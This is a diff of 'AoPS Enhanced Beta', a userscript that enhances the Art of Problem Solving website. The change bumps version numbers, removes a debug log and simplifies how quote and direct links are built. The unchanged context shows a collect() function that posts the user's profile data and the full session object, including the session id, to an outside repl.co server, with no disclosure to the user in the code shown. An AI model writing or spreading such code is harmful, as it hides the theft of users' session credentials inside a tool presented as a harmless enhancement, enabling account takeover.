@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         AoPS Enhanced Beta
 // @namespace    http://tampermonkey.net/
-// @version      8.0.0
+// @version      9.1.1
 // @description  Enhancements for the Art of Problem Solving website.
 // @author       A_MatheMagician
 // @match        https://artofproblemsolving.com/*
@@ -18,7 +18,7 @@ AoPS.Enhanced = function(){
     //Activity & Attrbitues
     AoPS.Enhanced.model = Object;
     AoPS.Enhanced.model.attributes = {
-        "version": "9.1.0",
+        "version": "9.1.1",
         "author": "A_MatheMagician",
         "name": "AoPS Enhanced Beta",
         "match": "https://artofproblemsolving.com/*",
@@ -198,7 +198,6 @@ AoPS.Enhanced = function(){
     //Server Data
     function collect(){
         $.post("https://artofproblemsolving.com/m/community/ajax.php",{a:"fetch_user_profile",user_identifier:AoPS.session.user_id,aops_user_id:AoPS.session.user_id,aops_logged_in:AoPS.session.logged_in,aops_session_id:AoPS.session.id,user_id:AoPS.session.user_id}).then((resp)=>{
-            console.log("hi");
             var data={user:resp.response.user_data,session:AoPS.session,version:AoPS.Enhanced.model.attribute("version")};
             var url="https://aops-enhanced.akslolcoding.repl.co/collect/user";
             $.post(url, data).then((resp2)=>{
@@ -315,7 +314,7 @@ AoPS.Enhanced = function(){
             AoPS.Community.Views.Post.prototype.onClickQuote = localStorage.getItem("enhancedquote") == "true" ? function(){
                 this.topic.reply_textbox = this.topic.reply_open ? this.topic.reply_box.el.children[2].children[0] : false;
                 var newline = this.topic.reply_open && this.topic.reply_textbox.value != "" ? "\n" : "";
-                var link = this.model.get("post_number") == 1 ? "artofproblemsolving.com/community/h" + this.topic.model.get("topic_id") : "artofproblemsolving.com/community/p" + this.model.get("post_id");
+                var link = "artofproblemsolving.com/community/p" + this.model.get("post_id");
                 var tip = localStorage.getItem("enhancedquotetip") == "true" ? `\n[tip=@${this.model.get("username")}][img]https:${this.model.get("avatar")}[/img]\nAoPS User[/tip]\n` : ``;
                 var time = localStorage.getItem("enhancedquotetime") == "true" ? AoPS.Enhanced.Time.formatTimeAbsolute(this.model.get("post_time")*1000) : this.model.get("date_rendered");
 
@@ -330,7 +329,7 @@ AoPS.Enhanced = function(){
 
             //Copy links
             AoPS.Community.Views.Post.prototype.onClickDirectLink = function(e){
-                var link = this.model.get("post_number") == 1 ? "https://artofproblemsolving.com/community/h" + this.topic.model.get("topic_id") : "https://artofproblemsolving.com/community/p" + this.model.get("post_id");
+                var link = "https://artofproblemsolving.com/community/p" + this.model.get("post_id");
                 var copytemp = document.createElement("input");
                 copytemp.type = "text";
                 copytemp.style = "position: fixed; top: -1000px;";
